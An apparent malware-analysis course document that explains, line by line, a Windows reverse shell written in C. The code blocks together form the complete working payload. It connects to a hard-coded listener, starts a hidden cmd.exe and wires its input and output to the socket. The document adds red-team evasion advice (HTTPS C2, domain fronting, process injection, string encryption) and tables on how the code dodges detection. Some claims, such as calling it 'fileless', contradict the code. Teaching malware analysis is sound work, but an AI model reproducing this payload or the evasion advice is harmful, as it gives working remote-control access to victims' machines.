# Shadow Shell — Comprehensive Code Documentation

> **Target Audience:** Cert IV Cyber Security students  
> **Purpose:** Line-by-line analysis of a minimal Windows reverse-shell payload written in C  
> **Assessment Context:** Final submission — demonstration of malware analysis capability  

---

## 1. Overview

This program is a **reverse shell** (also called a "connect-back shell"). Instead of opening a listening port on the victim machine (which would trigger most host-based firewalls), the victim *outbound* connects to an attacker-controlled **listener** (a machine waiting for connections). Once the TCP connection is established, the program spawns `cmd.exe` (the Windows command interpreter) and **redirects its standard input, output, and error streams** across the network socket. The result is that the attacker can type commands on their machine and they execute on the victim machine, with the output sent back over the same connection.

**Key characteristics:**
- No listening port on the victim → avoids `netstat` detection of open ports.
- Uses legitimate Windows APIs (`winsock2`, `kernel32`) → no exotic syscalls.
- Spawns `cmd.exe` hidden → no visible window for the user.
- Uses `WinMain` instead of `main` → compiles as a GUI subsystem application, so no console window flashes on launch.

---

## 2. Line-by-Line Breakdown

### 2.1 Preprocessor Directives and Headers

```c
#define _WINSOCK_DEPRECATED_NO_WARNINGS
```
**What it does:** Defines a preprocessor macro before any headers are included.  
**Why it's there:** Several Winsock functions used in this code (`inet_addr()`, `gethostbyname()`, etc.) have been marked as **deprecated** by Microsoft in favour of newer "safer" versions (e.g., `InetPton`). Without this macro, the compiler generates **warning C4996** ("This function or variable may be unsafe"). In malware, this is often suppressed to keep the build clean and avoid drawing attention to the fact that the author is using old, well-known APIs. For this assessment, it simply allows the code to compile without noise.  
**Concept:** *Preprocessor macros* are handled before compilation; they are not C statements but instructions to the compiler.

```c
#include <winsock2.h>
```
**What it does:** Pulls in the **Winsock 2** API header — the Windows implementation of the Berkeley Sockets API.  
**Why it's there:** Provides declarations for `WSAStartup`, `socket`, `connect`, `sockaddr_in`, `htons`, `inet_addr`, `closesocket`, `WSACleanup`, and the `SOCKET` type.  
**Important:** `winsock2.h` **must** be included **before** `windows.h` because `windows.h` includes an older `winsock.h` by default, and the two are incompatible. Including them in the wrong order causes redefinition errors.

```c
#include <windows.h>
```
**What it does:** Pulls in the core Windows API header.  
**Why it's there:** Provides declarations for `WinMain`, `CreateProcessA`, `STARTUPINFOA`, `PROCESS_INFORMATION`, `WaitForSingleObject`, `CloseHandle`, `HANDLE`, `HINSTANCE`, `LPSTR`, `SW_HIDE`, `STARTF_USESTDHANDLES`, `STARTF_USESHOWWINDOW`, `INFINITE`, `UNREFERENCED_PARAMETER`, and `BOOL`/`DWORD` types. This is the gateway to nearly every Windows system service.

```c
#include <stdio.h>
```
**What it does:** Standard C I/O header.  
**Why it's there:** In this specific program, `stdio.h` is not strictly needed because no `printf`, `scanf`, or file I/O is used. It may be a carry-over from development (e.g., debug prints that were later removed), or included out of habit. In malware, leaving unused headers can be a sign of rapid development or poor operational security (OPSEC). For analysis purposes, note that its presence does not affect runtime behaviour.

```c
#include <string.h>
```
**What it does:** Standard C string/memory manipulation header.  
**Why it's there:** Provides the declaration for `memset()`, which is used to zero-initialise the `STARTUPINFOA` structure. Without this header, the compiler would issue an implicit-function warning (or error, depending on settings).

```c
#pragma comment(lib, "ws2_32.lib")
```
**What it does:** A **compiler pragma** that instructs the Microsoft linker to automatically link against `ws2_32.lib` (the Winsock 2 import library).  
**Why it's there:** Normally, you would pass `-lws2_32` or add it to the linker settings in your IDE. This pragma embeds the dependency directly in the source code, ensuring that anyone compiling it does not need to remember to add the library manually. In malware source code, this is a convenience that reduces build friction.  
**Concept:** *Import libraries* contain stubs that tell the linker where in system DLLs (`ws2_32.dll`) the actual functions live at runtime.

---

### 2.2 Constant Definitions

```c
#define LISTENER_IP   "192.168.1.92"
```
**What it does:** Creates a textual macro substitution. Every occurrence of `LISTENER_IP` in the code is replaced by the string literal `"192.168.1.92"` before compilation.  
**Why it's there:** Hard-codes the **attacker's IP address** (the machine running the listener, e.g., Netcat, Metasploit `multi/handler`, or a custom Python script). Using a `#define` centralises the configuration — the operator only needs to change one line to retarget the payload.  
**Concept:** *String literals* in C are arrays of `char` terminated by a null byte (`\0`). They decay to `char*` when passed to functions like `inet_addr()`.

```c
#define LISTENER_PORT 8080
```
**What it does:** Creates a textual macro substitution. Every occurrence of `LISTENER_PORT` is replaced by the integer literal `8080`.  
**Why it's there:** Hard-codes the **destination TCP port** on the attacker's listener. Port 8080 is commonly used because it is often allowed through corporate firewalls (it is associated with HTTP proxy traffic) and is less suspicious than, say, port 4444 (the default Metasploit port, which IDS/IPS signatures often flag).

---

### 2.3 Function: `EstablishChannel`

```c
SOCKET EstablishChannel(void)
```
**What it does:** Declares a function named `EstablishChannel` that takes no arguments (`void`) and returns a value of type `SOCKET`.  
**Why it's there:** Encapsulates all network-setup logic into a reusable unit. If the connection fails, the caller can detect this via the return value.  
**Concept:** `SOCKET` is a typedef (usually an unsigned integer) defined in `winsock2.h` representing a **socket descriptor** — an opaque handle to a network endpoint, analogous to a file descriptor in Unix.

```c
{
```
**What it does:** Opens the function body.  
**Why it's there:** Required C syntax.

```c
    WSADATA wsData;
```
**What it does:** Declares a local variable named `wsData` of type `WSADATA`.  
**Why it's there:** `WSADATA` is a structure that receives information about the Windows Sockets implementation (version, description, system status, max sockets, etc.). Every Winsock application **must** call `WSAStartup` and provide a `WSADATA` buffer before using any other socket function.  
**Concept:** *Stack allocation* — `wsData` lives on the function's stack frame and is automatically discarded when the function returns.

```c
    if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
```
**What it does:** Calls `WSAStartup` and checks whether it succeeded.  
**Breakdown:**
- `MAKEWORD(2, 2)` is a macro that packs two bytes into a 16-bit value: `0x0202`. It requests **Winsock version 2.2**.
- `&wsData` passes the *address of* the `WSADATA` structure so `WSAStartup` can fill it.
- `!= 0` checks the return value. `WSAStartup` returns `0` on success; any non-zero value indicates failure (e.g., Winsock DLL not found, version not supported).
**Why it's there:** Winsock is not automatically initialised on Windows. This call loads `ws2_32.dll` into the process and prepares internal data structures. Without it, every subsequent socket call would fail with `WSANOTINITIALISED` (error 10093).  
**Concept:** `&` is the **address-of operator** in C, yielding a pointer to the variable.

```c
        return INVALID_SOCKET;
```
**What it does:** Returns the sentinel value `INVALID_SOCKET` to the caller.  
**Why it's there:** Signals that the channel could not be established. The caller (`WinMain`) checks for this value and exits gracefully rather than crashing or attempting to use an invalid socket.  
**Concept:** `INVALID_SOCKET` is a constant (usually `(SOCKET)(~0)`, i.e., all bits set) that denotes "no valid socket."

```c
    }
```
**What it does:** Closes the `if` block.  
**Why it's there:** Required C syntax.

```c
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
```
**What it does:** Creates a new socket and stores its descriptor in `sock`.  
**Breakdown of parameters:**
- `AF_INET` = **Address Family Internet** (IPv4). Tells Winsock we are using 4-byte IP addresses.
- `SOCK_STREAM` = **Stream socket**. Provides reliable, ordered, two-way, connection-based byte streams. This is the socket type used by TCP.
- `IPPROTO_TCP` = Explicitly requests the **TCP protocol**. While `0` would usually default to TCP for `SOCK_STREAM`, being explicit removes ambiguity.
**Why it's there:** This is the fundamental network endpoint creation step. Until this call, there is no kernel object representing a network connection.  
**Concept:** `socket()` returns a descriptor that the kernel uses to index internal data structures for that connection.

```c
    if (sock == INVALID_SOCKET) {
```
**What it does:** Checks whether `socket()` failed.  
**Why it's there:** Resource exhaustion, firewall interference, or DLL issues can cause socket creation to fail. We must handle this to avoid using an invalid handle.

```c
        WSACleanup();
```
**What it does:** Unloads the Winsock DLL and releases internal resources associated with this process's use of Winsock.  
**Why it's there:** Because `WSAStartup` succeeded earlier, we have a responsibility to call `WSACleanup` before returning, or we leak the reference count inside `ws2_32.dll`. Good practice (and required in larger programs) is to pair every successful `WSAStartup` with exactly one `WSACleanup`.

```c
        return INVALID_SOCKET;
```
**What it does:** Returns failure to the caller.  
**Why it's there:** Propagates the error so `WinMain` can exit.

```c
    }
```
**What it does:** Closes the `if` block.

```c
    struct sockaddr_in target;
```
**What it does:** Declares a variable `target` of type `struct sockaddr_in`.  
**Why it's there:** This structure holds the **destination address** — the IP and port we want to connect to. `sockaddr_in` is the IPv4-specific variant of the generic `sockaddr`.  
**Concept:** The `sockaddr` family of structures is how Berkeley sockets represent network addresses. The `_in` suffix denotes "Internet."

```c
    target.sin_family = AF_INET;
```
**What it does:** Sets the `sin_family` member to `AF_INET`.  
**Why it's there:** Tells the socket API that we are using an IPv4 address. This must match the `AF_INET` passed to `socket()`. If this field is wrong, `connect()` will fail with `WSAEFAULT` or `WSAEAFNOSUPPORT`.

```c
    target.sin_port = htons(LISTENER_PORT);
```
**What it does:** Sets the destination port, converting it from **host byte order** to **network byte order**.  
**Breakdown:**
- `htons` = **H**ost **T**o **N**etwork **S**hort (16-bit). Intel/AMD processors are **little-endian** (least significant byte first). Network protocols require **big-endian** (most significant byte first). `htons(8080)` turns `0x1F90` into `0x901F` in memory.
- `LISTENER_PORT` is substituted by the preprocessor as `8080`.
**Why it's there:** Failing to use `htons` would result in the port being interpreted incorrectly by the remote stack. For example, port 8080 (`0x1F90`) would be read as port 63616 (`0x901F`) if sent little-endian.

```c
    target.sin_addr.s_addr = inet_addr(LISTENER_IP);
```
**What it does:** Converts the dotted-decimal IP string `"192.168.1.92"` into a 32-bit unsigned integer in **network byte order** and stores it in the `s_addr` field.  
**Why it's there:** `sockaddr_in` does not store IP addresses as strings; it needs a packed binary representation. `inet_addr` parses the string and returns the 4-byte value. For `"192.168.1.92"`, the result is `0x5C01A8C0` in little-endian memory (which represents `192.168.1.92` when read big-endian on the wire).  
**Concept:** `inet_addr` returns `INADDR_NONE` (`(unsigned long)-1`) on parse failure. This code does not check for that error condition, which is a subtle weakness.

```c
    if (connect(sock, (struct sockaddr*)&target, sizeof(target)) == SOCKET_ERROR) {
```
**What it does:** Attempts to **initiate a TCP three-way handshake** with the remote listener and checks for failure.  
**Breakdown:**
- `connect()` takes three arguments: the socket descriptor, a pointer to a `sockaddr` structure, and the length of that structure.
- `(struct sockaddr*)&target` is a **type cast**. `connect()` is designed to work with multiple address families (IPv4, IPv6, UNIX domain, etc.), so it accepts the generic `struct sockaddr*`. We must cast our IPv4-specific pointer to this generic type to satisfy the compiler.
- `sizeof(target)` computes the size of the `sockaddr_in` structure at compile time (typically 16 bytes).
- `SOCKET_ERROR` is a constant (usually `-1`) indicating the call failed. On failure, `WSAGetLastError()` would reveal the exact cause (e.g., `WSAECONNREFUSED` = no listener, `WSAETIMEDOUT` = firewall drop).
**Why it's there:** This is the **punch-out** moment. The victim machine sends a `SYN` packet to the attacker. If the attacker is listening, a full TCP connection is established. If not, the program handles the error and cleans up.

```c
        closesocket(sock);
```
**What it does:** Releases the kernel resources associated with `sock`.  
**Why it's there:** We created the socket, so we must destroy it on the error path. In Unix this would be `close(sock)`; Winsock uses the specific `closesocket()` to allow for Windows-specific bookkeeping.

```c
        WSACleanup();
```
**What it does:** Unloads Winsock.  
**Why it's there:** Balances the successful `WSAStartup` from earlier.

```c
        return INVALID_SOCKET;
```
**What it does:** Returns failure.  
**Why it's there:** Notifies `WinMain` that no channel exists.

```c
    }
```
**What it does:** Closes the `if` block.

```c
    return sock;
```
**What it does:** Returns the valid, connected socket descriptor to the caller.  
**Why it's there:** The socket is now a live TCP connection to the attacker. This descriptor will be passed to `SpawnRemoteSession` to become the I/O backbone of the shell.

```c
}
```
**What it does:** Closes the `EstablishChannel` function.


---

### 2.4 Function: `SpawnRemoteSession`

```c
void SpawnRemoteSession(SOCKET sock)
```
**What it does:** Declares a function that takes a `SOCKET` parameter and returns nothing (`void`).  
**Why it's there:** Encapsulates the process-creation and stream-redirection logic. The function's job is to turn the network socket into an interactive command prompt.

```c
{
```
**What it does:** Opens the function body.

```c
    STARTUPINFOA si;
```
**What it does:** Declares a variable `si` of type `STARTUPINFOA`.  
**Why it's there:** `STARTUPINFO` (the ANSI version suffixed with `A`) is a structure used by `CreateProcessA` to specify how the new process should be created — window state, desktop, title, and critically, **standard handle redirection**. It is the primary mechanism for controlling the environment of a spawned child process on Windows.

```c
    PROCESS_INFORMATION pi;
```
**What it does:** Declares a variable `pi` of type `PROCESS_INFORMATION`.  
**Why it's there:** `CreateProcessA` fills this structure with handles to the newly created process and its primary thread, plus their respective IDs. We need the process handle to wait on it later.

```c
    memset(&si, 0, sizeof(si));
```
**What it does:** Zeroes out every byte of the `STARTUPINFOA` structure.  
**Breakdown:**
- `&si` = address of `si`.
- `0` = the byte value to fill with.
- `sizeof(si)` = number of bytes to fill (calculated at compile time; for `STARTUPINFOA` on 64-bit Windows this is typically 104 bytes).
**Why it's there:** `STARTUPINFOA` contains many fields we do not explicitly set. Windows documentation states that unused fields should be zero. Without `memset`, stack garbage in those fields could cause `CreateProcessA` to interpret them as valid flags or pointers, leading to undefined behaviour or failure. This is **defensive initialisation**.

```c
    si.cb = sizeof(si);
```
**What it does:** Sets the `cb` (count of bytes) member to the size of the structure.  
**Why it's there:** This is a **versioning mechanism** built into the Windows API. `CreateProcessA` checks `si.cb` to determine which version of `STARTUPINFO` you are passing. If you pass an old, smaller size, the OS knows not to look for newer fields. If you pass a larger size, it knows you are using an extended structure. It is **mandatory** to set this field.

```c
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
```
**What it does:** Sets the `dwFlags` bitmask to combine two flags using the bitwise OR operator (`|`).  
**Breakdown of flags:**
- `STARTF_USESTDHANDLES` (value `0x00000100`) = "The `hStdInput`, `hStdOutput`, and `hStdError` members contain valid handles that should be used instead of the defaults."
- `STARTF_USESHOWWINDOW` (value `0x00000001`) = "The `wShowWindow` member contains valid window-state information."
**Why it's there:** Without `STARTF_USESTDHANDLES`, Windows would ignore our socket handles and create default console buffers for the new process, breaking the remote shell. Without `STARTF_USESHOWWINDOW`, Windows would decide the window state automatically (usually visible).

```c
    si.wShowWindow = SW_HIDE;
```
**What it does:** Sets the window state to **hidden**.  
**Why it's there:** `SW_HIDE` (value `0`) instructs Windows not to display the `cmd.exe` window. From the victim's perspective, nothing appears on screen — no flashing console, no taskbar icon for the shell window. This is a stealth measure.

```c
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
```
**What it does:** Performs a **multiple assignment** in a single statement, setting all three standard I/O handles to the same value: the socket cast to `HANDLE`.  
**Breakdown:**
- `hStdInput` = the handle from which `cmd.exe` reads keyboard input.
- `hStdOutput` = the handle to which `cmd.exe` writes normal output.
- `hStdError` = the handle to which `cmd.exe` writes error messages.
- `(HANDLE)sock` = a **C-style cast** converting the `SOCKET` type to `HANDLE`.
**Why it's there:** This is the **core trick** of the reverse shell. On Windows, sockets are kernel objects represented by numeric handles, just like files, pipes, and consoles. Because the Windows kernel treats them similarly at the I/O dispatch layer, `cmd.exe` never realises it is reading from and writing to a TCP socket rather than a local console. Every keystroke sent by the attacker arrives on `hStdInput`; every line of output from `cmd.exe` goes out on `hStdOutput` across the network.

```c
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
```
**What it does:** Spawns a new process — in this case, the Windows Command Prompt.  
**Parameter-by-parameter breakdown:**
1. `NULL` (lpApplicationName) = We are not specifying the executable path directly; instead we provide the command line in the next argument, letting Windows search `%PATH%` for `cmd.exe`.
2. `"cmd.exe"` (lpCommandLine) = The command line for the new process. `cmd.exe` is the Windows shell interpreter. Because this is passed as a modifiable string literal (technically it should be a writable buffer because `CreateProcessA` may modify it), this works in practice but is technically undefined behaviour in strict C.
3. `NULL` (lpProcessAttributes) = Default security descriptor for the process; no special inheritance restrictions.
4. `NULL` (lpThreadAttributes) = Default security descriptor for the primary thread.
5. `TRUE` (bInheritHandles) = **CRITICAL**. This boolean must be `TRUE` so that the child process inherits the socket handle we placed in `si.hStdInput/Output/Error`. If this were `FALSE`, `cmd.exe` would receive invalid handles and immediately exit.
6. `0` (dwCreationFlags) = No special creation flags. We are not creating a new console (`CREATE_NEW_CONSOLE`), not detaching from the current console (`DETACHED_PROCESS`), not suspending the thread (`CREATE_SUSPENDED`). We want a normal, immediate start.
7. `NULL` (lpEnvironment) = Inherit the parent's environment block.
8. `NULL` (lpCurrentDirectory) = Start `cmd.exe` in the parent's current directory.
9. `&si` = Pointer to our fully configured `STARTUPINFOA`.
10. `&pi` = Pointer to the `PROCESS_INFORMATION` structure that receives output.
**Why it's there:** This creates the actual shell process. Because of the handle inheritance and standard handle redirection, the attacker now controls it remotely.

```c
    WaitForSingleObject(pi.hProcess, INFINITE);
```
**What it does:** Blocks the calling thread until the `cmd.exe` process terminates.  
**Breakdown:**
- `pi.hProcess` = A kernel handle to the process object, returned by `CreateProcessA`.
- `INFINITE` = Wait forever. The function does not return until `cmd.exe` exits (e.g., the attacker types `exit`, or the connection drops and `cmd.exe` hits EOF and closes).
**Why it's there:** Prevents the parent program from exiting immediately. If the parent exited, the socket might close prematurely (depending on handle inheritance and reference counting), cutting off the attacker. The parent stays alive as a "babysitter" for the shell session.

```c
    CloseHandle(pi.hProcess);
```
**What it does:** Closes the handle to the process object.  
**Why it's there:** Every handle obtained from `CreateProcessA` consumes a slot in the process handle table. Failing to close it is a **handle leak**. Once closed, the kernel can free the underlying process object (though the actual process memory is not reclaimed until the process itself exits and all other handles are closed).

```c
    CloseHandle(pi.hThread);
```
**What it does:** Closes the handle to the primary thread object.  
**Why it's there:** Same reason as above — prevents handle leaks and allows kernel cleanup.

```c
}
```
**What it does:** Closes the `SpawnRemoteSession` function.

---

### 2.5 Function: `WinMain`

```c
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
```
**What it does:** Declares the **graphical subsystem entry point** for a Windows application.  
**Breakdown of parameters:**
- `int` = Return type. `0` traditionally means success.
- `WINAPI` = A calling-convention macro expanding to `__stdcall`. This dictates how arguments are pushed onto the stack and who cleans them up (the callee). Windows API functions use `__stdcall`; omitting `WINAPI` would cause stack corruption.
- `HINSTANCE hInst` = A handle to the current application instance (its base address in memory). Used for loading resources.
- `HINSTANCE hPrev` = Always `NULL` on modern Windows (32-bit and 64-bit). Kept for compatibility with 16-bit Windows.
- `LPSTR lpCmd` = The command-line arguments as a single string (not parsed into `argv[]`).
- `int nShow` = A flag indicating how the application's main window should be shown (e.g., normal, minimised, maximised).
**Why it's there:** Using `WinMain` instead of `main` causes the linker to produce a **GUI-subsystem executable** (`/SUBSYSTEM:WINDOWS`). When launched, Windows does **not** allocate a console for the program. If `main` were used, a console window would appear, alerting the user. This is a stealth decision.

```c
{
```
**What it does:** Opens the function body.

```c
    UNREFERENCED_PARAMETER(hInst);
```
**What it does:** A macro (defined in `windows.h`) that expands to `(void)(hInst);` — casting the parameter to `void` to silence the compiler warning "unreferenced formal parameter."  
**Why it's there:** We do not need the instance handle for this program. The macro suppresses warnings without disabling them globally, keeping the build clean.

```c
    UNREFERENCED_PARAMETER(hPrev);
```
**What it does:** Same suppression for `hPrev`.  
**Why it's there:** `hPrev` is always `NULL` and unused here.

```c
    UNREFERENCED_PARAMETER(lpCmd);
```
**What it does:** Same suppression for `lpCmd`.  
**Why it's there:** The payload does not accept command-line arguments.

```c
    UNREFERENCED_PARAMETER(nShow);
```
**What it does:** Same suppression for `nShow`.  
**Why it's there:** We do not create any windows, so the show flag is irrelevant.

```c
    SOCKET channel = EstablishChannel();
```
**What it does:** Calls `EstablishChannel()` and stores the returned socket descriptor in `channel`.  
**Why it's there:** This is the orchestration step. The main entry point delegates network setup to the helper function.

```c
    if (channel == INVALID_SOCKET) {
```
**What it does:** Checks whether the connection attempt failed.  
**Why it's there:** We must not proceed to spawn a shell if there is no network channel. Attempting to use `INVALID_SOCKET` as a standard handle would fail or crash.

```c
        return 1;
```
**What it does:** Returns `1` (a non-zero value indicating failure) to the operating system.  
**Why it's there:** Signals that the program could not complete its intended task.

```c
    }
```
**What it does:** Closes the `if` block.

```c
    SpawnRemoteSession(channel);
```
**What it does:** Passes the connected socket to `SpawnRemoteSession`, which spawns `cmd.exe` and redirects its I/O.  
**Why it's there:** This is the payload activation. The program blocks here until the shell session ends.

```c
    closesocket(channel);
```
**What it does:** Closes the socket after the shell session terminates.  
**Why it's there:** Cleans up the network resource. This sends a TCP `FIN` packet to the attacker, gracefully closing the connection from the victim side.

```c
    WSACleanup();
```
**What it does:** Unloads the Winsock DLL.  
**Why it's there:** Balances the `WSAStartup` called inside `EstablishChannel`. This is proper resource hygiene.

```c
    return 0;
```
**What it does:** Returns `0` (success) to Windows.  
**Why it's there:** Signals normal termination.

```c
}
```
**What it does:** Closes the `WinMain` function and the program.


---

## 3. Key Concepts

### 3.1 Winsock (Windows Sockets)

Winsock is Microsoft's implementation of the **Berkeley Sockets API** (originally from BSD Unix), adapted for Windows. It allows user-mode programs to perform network I/O via TCP/IP, UDP/IP, and other protocols.

- **Winsock 1.1** shipped with Windows 3.x and was limited.
- **Winsock 2** (used here, requested via `MAKEWORD(2,2)`) added support for multiple protocol stacks, quality of service, and socket extensions.

Every process using Winsock must call `WSAStartup` before any socket function and `WSACleanup` when finished. This reference-counts the `ws2_32.dll` load inside the process.

### 3.2 TCP/IP Sockets

A **socket** is an endpoint for communication. The program creates a **TCP stream socket** (`SOCK_STREAM` + `IPPROTO_TCP`), which provides:
- **Reliability:** Packets are retransmitted if lost.
- **Ordering:** Data arrives in the order it was sent.
- **Full-duplex:** Both sides can send and receive simultaneously.

The **three-way handshake** (`SYN` → `SYN-ACK` → `ACK`) happens inside `connect()`. From a packet analysis perspective, you will see the victim send a `SYN` to the attacker's IP on port 8080.

### 3.3 `sockaddr_in`

```c
struct sockaddr_in {
    short   sin_family;      // Address family (AF_INET)
    u_short sin_port;        // Port in network byte order
    struct  in_addr sin_addr;// IPv4 address in network byte order
    char    sin_zero[8];     // Padding to match sockaddr size
};
```

This structure is the IPv4-specific address container. The generic `sockaddr` (used by `connect`) is larger and designed to accommodate IPv6 and other families. Casting `sockaddr_in*` to `sockaddr*` is the standard Berkeley idiom for protocol-family polymorphism.

### 3.4 `htons` — Host To Network Short

Computers store multi-byte integers in either **little-endian** (Intel/AMD: least significant byte at lowest address) or **big-endian** (network protocols: most significant byte first). `htons` swaps the byte order on little-endian machines and is a no-op on big-endian machines. It ensures that port numbers are interpreted consistently regardless of the host CPU architecture.

### 3.5 `inet_addr` — Internet Address

Converts a human-readable dotted-decimal string (`"192.168.1.92"`) into a 32-bit unsigned integer suitable for `sockaddr_in.sin_addr.s_addr`. The result is already in network byte order, so no additional `htonl` is required.

**Deprecation note:** Microsoft recommends `InetPton` because `inet_addr` cannot distinguish the error return value `INADDR_NONE` (`255.255.255.255`) from a valid IP. This code uses the old function for simplicity.

### 3.6 `STARTUPINFO`

`STARTUPINFO` is the control panel for `CreateProcess`. It contains 17+ fields controlling:
- Desktop and window station
- Console window size and position
- Standard handle redirection
- Process group and priority class hints

Setting `cb` (count of bytes) is mandatory because the OS uses it for versioning. Setting `dwFlags` tells the OS which other fields are valid.

### 3.7 `PROCESS_INFORMATION`

Filled by `CreateProcess`, this structure gives the parent process:
- `hProcess`: A handle usable with `WaitForSingleObject`, `TerminateProcess`, etc.
- `hThread`: A handle to the primary thread.
- `dwProcessId`: The PID visible in Task Manager.
- `dwThreadId`: The TID of the primary thread.

These handles have full access rights by default because the parent created the process.

### 3.8 `CreateProcess`

`CreateProcessA` is the workhorse of Windows process creation. Unlike `system()` or `exec()` on Unix, `CreateProcess` gives fine-grained control over inheritance, security, environment, working directory, and window appearance.

The `bInheritHandles` parameter is crucial here: `TRUE` means all inheritable handles in the parent are duplicated into the child. Since socket handles are inheritable by default, the child gets a copy of the TCP socket as its stdin/stdout/stderr.

### 3.9 STDIN / STDOUT Redirection

On Unix, "everything is a file" — sockets have file descriptors and can be `dup2`'d onto stdin/stdout. On Windows, the abstraction is "everything is a **handle**" (a kernel object reference). Because the Windows I/O manager dispatches reads and writes on handles without caring whether the underlying object is a file, pipe, console, or socket, redirecting a socket to standard I/O works transparently.

When `cmd.exe` starts:
1. It calls `ReadFile` on its `hStdInput` to get keystrokes.
2. The kernel routes this to the TCP socket driver.
3. Data arrives from the attacker over the network.
4. When `cmd.exe` calls `WriteFile` on `hStdOutput`, the kernel sends the buffer out through the socket.

### 3.10 `WinMain` vs `main`

| Feature | `main` | `WinMain` |
|---------|--------|-----------|
| Subsystem | Console (`/SUBSYSTEM:CONSOLE`) | GUI (`/SUBSYSTEM:WINDOWS`) |
| Console on launch | Yes, allocated by OS | No |
| Entry point signature | `int main(int argc, char** argv)` | `int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)` |
| Typical use | CLI tools, scripts | GUI applications, background services |
| User visibility | Console window appears | Nothing appears by default |

Malware authors prefer `WinMain` for silent execution. The program can still call console APIs or redirect I/O even without having its own console window.

### 3.11 `HANDLE` Casting

```c
(HANDLE)sock
```

This is a blunt C-style cast. Under the hood:
- `SOCKET` is typedef'd to `UINT_PTR` (an unsigned integer the size of a pointer).
- `HANDLE` is typedef'd to `void*`.

Both are ultimately just numeric identifiers indexing into the process **handle table** maintained by the Windows kernel. The cast works because:
1. The socket was created in the same process.
2. Windows object manager treats socket objects and file objects similarly for synchronous I/O.
3. `cmd.exe` uses generic `ReadFile`/`WriteFile` APIs that accept any valid handle.

**Caveat:** This is implementation-dependent. It works on modern Windows because the kernel architecture supports it, but it is not guaranteed by any public standard.

---

## 4. Why This Technique Works (Red Team Perspective)

### 4.1 The Outbound Connection Model

Traditional "bind shells" listen on a port on the victim. They are easy to detect because:
- `netstat -an` shows a listening port.
- Host firewalls block inbound connections by default.
- EDR (Endpoint Detection and Response) products flag unknown listening processes.

A **reverse shell** flips the model: the victim connects **outbound** to the attacker. Most networks allow outbound TCP on ports 80, 443, and 8080 (web traffic). The firewall sees an outbound connection, which is normal user behaviour, and often allows it.

### 4.2 Living Off the Land

The program does not drop a custom executable or use exotic APIs. It uses:
- `ws2_32.dll` — present on every Windows machine since Windows 95.
- `cmd.exe` — the legitimate Windows command interpreter, signed by Microsoft.
- Standard Windows process-creation APIs.

Because `cmd.exe` is a trusted binary, some application-whitelisting solutions will not block it. The payload is essentially "using Windows against itself."

### 4.3 No Disk Persistence

The program is entirely **fileless** in its operation (assuming it is injected or run from memory). It does not write to disk beyond its own initial executable. Once it exits, the only forensic artefacts are:
- The executable file itself (if not deleted).
- Network logs showing the outbound connection.
- Process creation events in the Windows Event Log (if auditing is enabled).

### 4.4 Minimal Footprint

The code is approximately 40 lines. Small code means:
- Fast compilation.
- Small binary size (easy to embed in exploits or droppers).
- Fewer opportunities for signatures or heuristics to catch it.

---

## 4.5 Real-World Priming

### The Lab Lie

**What the lab lets you believe:** A raw TCP reverse shell on port 8080 is stealthy because it's small, uses outbound connections, and hides its console window.

**What the lab hides from you:** Enterprise firewalls block outbound 8080/8890. EDR behavioral rules flag the exact API sequence `WSAStartup` → `socket` → `connect` → `CreateProcessA` with `STARTF_USESTDHANDLES`. The IP string is visible in the binary's `.rdata` section. Parent-child correlation (`spoolsv.exe` → `cmd.exe`) is an instant alert.

### How It Dies in Production

| Defense | How It Kills This Technique | Your Lab Bypass |
|---------|---------------------------|-----------------|
| Enterprise firewall | Blocks outbound non-standard ports; only 80/443 through proxy | Classroom LAN is permissive |
| EDR behavioral detection | Flags socket→connect→CreateProcessA with handle inheritance | Defender was stopped |
| Memory / string scanning | Finds hardcoded IP `"192.168.1.92"` in `.rdata` | No memory scanner in lab |
| Proxy inspection | Decrypts and inspects HTTPS; raw TCP is anomalous | No proxy in lab |
| Parent-child correlation | `spoolsv.exe` spawning `cmd.exe` is highly suspicious | No EDR telemetry in lab |

### What a Professional Red Teamer Would Do

**Instead of raw TCP on 8080, they would use:**
- **HTTPS C2 over port 443** — blends into normal web traffic, survives proxy inspection, looks like browser activity
- **Domain fronting or CDN riding** — hides true destination behind CloudFront/Akamai edge servers
- **Process injection into browser** — Edge/Chrome making HTTPS connections is completely normal; no suspicious parent
- **Encrypted payload with runtime decryption** — hides C2 IP and port strings from static analysis

**Key difference:** The pro doesn't try to hide the connection. They make the connection look like a billion other legitimate connections.

### What to Learn Next

| Concept | Why It Matters | Where to Start |
|---------|---------------|----------------|
| WinHTTP API | Native HTTPS without raw socket APIs | Microsoft Docs: "WinHTTP vs. WinInet" |
| Certificate pinning | Prevents enterprise proxy MITM | OWASP Certificate Pinning guide |
| JA3 fingerprint randomization | Evades TLS client fingerprinting used to detect malware | GitHub: `salesforce/ja3` |
| String encryption | Hides C2 config from static analysis | XOR or RC4 runtime decryption |

### The Honest Bottom Line

> This reverse shell teaches socket programming, process spawning, and stdio redirection. It does not teach C2 evasion. In the real world, raw TCP shells on non-standard ports are the first thing every SOC analyst learns to detect. The value of this code is understanding the **primitives** — not deploying them as-is. Learn HTTPS C2 next.

---

## 5. Detection Vectors and How the Code Avoids Them

### 5.1 Network Detection

| Vector | What the Defender Sees | How the Code Avoids It |
|--------|------------------------|------------------------|
| Inbound port scan / open port | `SYN` packets to victim port | No listening port; victim initiates outbound |
| Uncommon destination port | Connection to attacker on 4444 | Uses 8080 (HTTP-proxy-like) |
| Long-lived idle connection | TCP session open with no data | Not avoidable; anomaly detection may flag it |
| DNS lookup | Victim resolves attacker domain | Uses raw IP; no DNS query generated |

**Mitigation for defenders:** Monitor for **outbound** connections from unexpected processes (e.g., an unknown `.exe` on a workstation connecting to a non-corporate IP on port 8080). Use egress filtering and proxy all outbound traffic through an inspection point.

### 5.2 Host Detection

| Vector | What the Defender Sees | How the Code Avoids It |
|--------|------------------------|------------------------|
| Console window | User sees `cmd.exe` window | `WinMain` + `SW_HIDE` = no window |
| Process name | Suspicious binary name | The parent process name is suspicious, but `cmd.exe` is trusted |
| Command-line arguments | `cmd.exe` spawned with odd args | Arguments are `NULL`; just `"cmd.exe"` — looks normal |
